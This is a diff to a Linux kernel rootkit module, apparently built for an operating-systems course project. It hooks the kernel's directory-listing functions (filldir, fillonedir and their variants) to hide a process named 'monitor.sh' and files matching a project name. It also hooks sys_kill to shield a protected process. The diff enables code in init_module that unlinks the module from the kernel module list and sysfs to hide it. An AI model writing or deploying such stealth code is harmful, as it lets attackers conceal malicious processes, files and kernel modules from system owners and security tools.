@@ -17,45 +17,27 @@
 
 
 #define FLAG 0x80000000
-const char *protected = "monitor.sh";
+const char *protected = "poc.c";
 const char *hide = "monitor.sh";
 int hidden_pid=-1;
 int protected_pid=-1;
 
-// static int adore_atoi(const char *str)
-// {
-//         int ret = 0, mul = 1;
-//         const char *ptr;
-//         for (ptr = str; *ptr >= '0' && *ptr <= '9'; ptr++);
-//         ptr--;
-//         while (ptr >= str) {
-//                 if (*ptr < '0' || *ptr > '9')
-//                         break;
-//                 ret += (*ptr - '0') * mul;
-//                 mul *= 10;
-// 		ptr--;   
-//         }
-//         return ret;
-// }
 
 static int print_pid(void)
 {
 	struct task_struct * task, * p;
 	struct list_head * pos;
 	int count = 0;
-	printk("Hello World enter begin:\n");
 	task =& init_task;
 	list_for_each(pos, &task->tasks)
 	{
 		p = list_entry(pos, struct task_struct, tasks);
 		count++;
-		printk("%d---------->%s\n", p->pid, p->comm);
 	}
-	printk("the number of process is: %d\n", count);
 	return 0;
 }
 
-static int find_pid(const char *victim)
+static int find_pid(const char *victim)      //find pid by process name
 {
 	struct task_struct * task, * p;
 	struct list_head * pos;
@@ -79,7 +61,7 @@ static int khook_fillonedir(void *__buf, const char *name, int namlen, loff_t of
 	int ret = 0;
 	hidden_pid=find_pid(hide);
 	pid = simple_strtol(name, &endp, 10);
-	if (pid!=hidden_pid && !strstr(name, "run"))
+	if (pid!=hidden_pid && !strstr(name, "OS-CourseDesign"))
 		ret = KHOOK_ORIGIN(fillonedir, __buf, name, namlen, offset, ino, d_type);
 	return ret;
 }
@@ -92,7 +74,7 @@ static int khook_filldir(void *__buf, const char *name, int namlen, loff_t offse
 	int ret = 0;
 	hidden_pid=find_pid(hide);
 	pid = simple_strtol(name, &endp, 10);
-	if (pid != hidden_pid && !strstr(name, "run"))
+	if (pid != hidden_pid && !strstr(name, "OS-CourseDesign"))
 		ret = KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
 	return ret;
 }
@@ -106,7 +88,7 @@ static int khook_filldir64(void *__buf, const char *name, int namlen,
 	int ret = 0;
 	hidden_pid=find_pid(hide);
 	pid = simple_strtol(name, &endp, 10);
-	if (pid != hidden_pid && !strstr(name, "run"))
+	if (pid != hidden_pid && !strstr(name, "OS-CourseDesign"))
 		ret = KHOOK_ORIGIN(filldir64, __buf, name, namlen, offset, ino, d_type);
 	return ret;
 }
@@ -120,7 +102,7 @@ static int khook_compat_fillonedir(void *__buf, const char *name, int namlen,
 	int ret = 0;
 	hidden_pid=find_pid(hide);
 	pid = simple_strtol(name, &endp, 10);
-	if (pid != hidden_pid && !strstr(name, "run"))
+	if (pid != hidden_pid && !strstr(name, "OS-CourseDesign"))
 		ret = KHOOK_ORIGIN(compat_fillonedir, __buf, name, namlen, offset, ino, d_type);
 	return ret;
 }
@@ -135,12 +117,11 @@ static int khook_compat_filldir64(void *__buf, const char *name, int namlen,
 	int ret = 0;
 	hidden_pid=find_pid(hide);
 	pid = simple_strtol(name, &endp, 10);
-	if (pid != hidden_pid && !strstr(name, "run"))
+	if (pid != hidden_pid && !strstr(name, "OS-CourseDesign"))
 		ret = KHOOK_ORIGIN(compat_filldir64, __buf, name, namlen, offset, ino, d_type);
 	return ret;
 }
 #endif
-
 
 
 KHOOK_EXT(long, sys_kill, pid_t, int);
@@ -157,9 +138,9 @@ static long khook_sys_kill(pid_t pid, int sig) {
 int init_module(void)
 {
 	print_pid();
-	//list_del_init(&__this_module.list);
-	//kobject_del(&THIS_MODULE->mkobj.kobj);
-	return khook_init();
+	list_del_init(&__this_module.list);
+	kobject_del(&THIS_MODULE->mkobj.kobj);      //hide the lkm
+	return khook_init(); 
 }
 
 void cleanup_module(void)
